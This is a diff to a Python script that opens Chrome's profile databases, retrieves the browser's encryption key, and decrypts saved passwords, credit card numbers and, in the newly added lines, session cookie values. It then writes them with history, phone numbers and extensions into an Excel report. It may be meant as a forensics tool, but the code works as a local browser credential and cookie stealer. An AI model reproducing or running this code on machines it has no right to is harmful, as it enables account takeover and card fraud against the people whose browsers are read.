@@ -36,6 +36,7 @@ def humanTime(timestamp):
     #create an object for the number of microseconds in the timestamp
     delta = datetime.timedelta(microseconds=int(timestamp))
     return epoch_start + delta
+
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
                                     "AppData", "Local", "Google", "Chrome",
@@ -72,7 +73,9 @@ else:
     os.mkdir("Data")
 
 #menu system
+
 def menuSystem():
+    global root_dir
     menu1=True
     menu2=True
     while menu1:
@@ -124,7 +127,7 @@ def menuSystem():
           os.system("cls||clear")
           print("\n[-] Invalid selection!")
 menuSystem()
-
+print(root_dir)
 #DB Files
 history = root_dir + "\History"
 logins = root_dir + "\Login Data"
@@ -133,6 +136,7 @@ phoneNumber = root_dir + "\Web Data"
 creditCards = root_dir + "\Web Data"
 extensions = root_dir + "\Extensions"
 json_dir = logins
+cookies = root_dir + "\\Network\Cookies"
 #SELECT statements
 selectURL = "SELECT title, visit_count, typed_count, last_visit_time, url FROM urls"
 selectLogin = "SELECT origin_url, username_value, password_value, date_last_used \
@@ -142,6 +146,8 @@ FROM network_action_predictor"
 selectPhone = "SELECT number FROM autofill_profile_phones"
 selectCard = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted \
 ,use_count, use_date, billing_address_id FROM credit_cards"
+selectCookies = "SELECT creation_utc, expires_utc, last_access_utc \
+, host_key, name, last_update_utc, is_secure, is_httponly, encrypted_value FROM cookies"
 
 
 #extract browsing history
@@ -173,6 +179,21 @@ df_phone = pd.read_sql(selectPhone, c_phone)
 #extract credit card information
 c_card = sqlite3.connect(creditCards)
 df_card = pd.read_sql(selectCard, c_card)
+df_card["decoded_card_number"] = df_card["card_number_encrypted"].apply(decrypt_password, key=key)
+del df_card["card_number_encrypted"]
+
+c_cookies = sqlite3.connect(cookies)
+df_cookies = pd.read_sql(selectCookies, c_cookies)
+df_cookies["creation_time"] = df_cookies["creation_utc"].apply(humanTime)
+df_cookies["expiration"] = df_cookies["expires_utc"].apply(humanTime)
+df_cookies["alst accessed"] = df_cookies["last_access_utc"].apply(humanTime)
+df_cookies["last_update"] = df_cookies["last_update_utc"].apply(humanTime)
+df_cookies["value"] = df_cookies["encrypted_value"].apply(decrypt_password, key=key)
+del df_cookies["creation_utc"]
+del df_cookies["expires_utc"]
+del df_cookies["last_access_utc"]
+del df_cookies["last_update_utc"]
+del df_cookies["encrypted_value"]
 
 for filename in os.listdir(extensions):
     # Check if the file is a JSON file
@@ -197,8 +218,9 @@ with pd.ExcelWriter(saveFile) as writer:
     df_login.to_excel(writer, sheet_name="LoginData", index=False)
     df_predict.to_excel(writer, sheet_name="Action Predictor", index=False)
     df_phone.to_excel(writer, sheet_name="Phone numbers", index=False)
-    df_card.to_excel(writer, sheet_name="Credit cards", index=False)
+    df_card.to_excel(writer, sheet_name="Credit Cards", index=False)
     df_ext.to_excel(writer, sheet_name="Extensions", index=False)
+    df_cookies.to_excel(writer, sheet_name="Cookies", index=False)
 
     for column in df_url:
         column_length = max(df_url[column].astype(str).map(len).max(), len(column))
@@ -208,6 +230,26 @@ with pd.ExcelWriter(saveFile) as writer:
         column_length = max(df_login[column].astype(str).map(len).max(), len(column))
         col_idx = df_login.columns.get_loc(column)
         writer.sheets['LoginData'].set_column(col_idx, col_idx, column_length)
+    for column in df_predict:
+        column_length = max(df_predict[column].astype(str).map(len).max(), len(column))
+        col_idx = df_predict.columns.get_loc(column)
+        writer.sheets['Action Predictor'].set_column(col_idx, col_idx, column_length)
+    for column in df_phone:
+        column_length = max(df_phone[column].astype(str).map(len).max(), len(column))
+        col_idx = df_phone.columns.get_loc(column)
+        writer.sheets['Phone numbers'].set_column(col_idx, col_idx, column_length)
+    for column in df_card:
+        column_length = max(df_card[column].astype(str).map(len).max(), len(column))
+        col_idx = df_card.columns.get_loc(column)
+        writer.sheets['Credit Cards'].set_column(col_idx, col_idx, column_length)
+    for column in df_ext:
+        column_length = max(df_ext[column].astype(str).map(len).max(), len(column))
+        col_idx = df_ext.columns.get_loc(column)
+        writer.sheets['Extensions'].set_column(col_idx, col_idx, column_length)
+    for column in df_cookies:
+        column_length = max(df_cookies[column].astype(str).map(len).max(), len(column))
+        col_idx = df_cookies.columns.get_loc(column)
+        writer.sheets['Cookies'].set_column(col_idx, col_idx, column_length)
 print("\n[+]XLSX Report created succesfully")
 
 # saveFile = ("data/" + today.strftime("%b-%d-%Y") + ".xlsx")
